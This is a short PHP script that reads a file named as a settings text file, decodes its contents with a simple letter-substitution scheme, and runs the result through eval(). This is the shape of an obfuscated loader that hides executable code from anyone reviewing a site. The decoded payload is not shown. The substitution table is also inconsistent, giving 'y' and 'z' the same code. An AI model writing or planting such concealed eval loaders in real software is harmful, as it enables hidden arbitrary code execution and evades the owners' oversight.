<?php session_start();
$homepage = file_get_contents("encoder2/index-settings.txt");
$LETTER  = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z');
$ENCODE  = array('A1','B2','C3','D4','E5','F6','G7','H8','I9','J10','K11','L12','M13','N14','O15','P16','Q17','R18','S19','T20','U21','V22','W23','X24','Y25','Z26','a1','b2','c3','d4','e5','f6','g7','h8','i9','j10','k11','l12','m13','n14','o15','p16','q17','r18','s19','t20','u21','v22','w23','x24','y26','z26');
$homepage = str_replace($ENCODE, $LETTER, $homepage);
eval("?> $homepage <?php ");
?>